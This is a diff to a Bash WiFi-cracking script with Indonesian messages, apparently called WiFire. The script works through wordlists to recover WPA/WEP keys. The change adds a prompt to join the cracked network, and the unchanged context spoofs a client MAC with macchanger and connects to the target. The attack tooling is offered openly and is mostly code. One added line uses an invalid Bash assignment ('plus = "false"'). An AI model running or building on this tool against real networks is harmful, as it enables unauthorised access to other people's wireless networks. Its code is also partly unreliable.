@@ -170,7 +170,6 @@ tampil info "Skrip ini berfungsi untuk melakukan cracking WiFi password (WPA/WEP
 dir="/pentest/passwords/wordlists/"
 ls $dir >> /tmp/WiFire.dic
 arrayDic=( $(cat /tmp/WiFire.dic) )
-
 dic=""
 id=""
 index="0"
@@ -178,7 +177,6 @@ for item in "${arrayDic[@]}"; do
         if [ "$dic" ] && [ "$dic" == "$item" ] ; then id="$index" ; fi
         index=$(($index+1))
 done
-
 echo -e "Berikut adalah daftar wordlist kamu:"
 loop=${#arrayDic[@]}
 echo -e " Num |  Nama Dictionary   \n-----|------------------- "
@@ -390,10 +388,18 @@ if [ "$mode" == "crack" ] ; then
 #========================================================================================================================
    if [ -e "/tmp/WiFire.key" ] ; then
       key=$(cat /tmp/WiFire.key)
-      tampil info "WiFi key: $key" 
+      tampil info "WiFi key: $key"
+      echo -en "[~] Key, ditemukan. Apakah kamu ingin mengkoneksikan ke Wireless [y/n] ? "
+      read commit
+      if [ $commit == "y" ] ; then plus="true"
+      elif [ $commit == "n" ] ; then plus = "false"
+      else
+          tampil error "Pilihan tidak valid!!!"
+          return 0
+      fi
       if [ "$plus" == "true" ] ; then
          if [ "$client" != "$mac" ] ; then
-            if [ "" != "0" ] || [ "" == "true" ] || [ "$debug" == "true" ] ; then tampil aksi "Attack (Spoofing): $client" ; fi
+            if [ "" != "0" ] || [ "" == "true" ] ; then tampil aksi "Attack (Spoofing): $client" ; fi
          aksi "airmon-ng" "ifconfig $interface down && macchanger -m $client $interface && ifconfig $interface up"   "true"
          fi
          tampil aksi "Bergabung: $essid" 
@@ -411,6 +417,8 @@ if [ "$mode" == "crack" ] ; then
             gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
             tampil info "Gateway: $gateway" 
          fi
+      else
+          cleanup clean
       fi
 #========================================================================================================================
    elif [ "$encryption" == "WPA" ] ; then
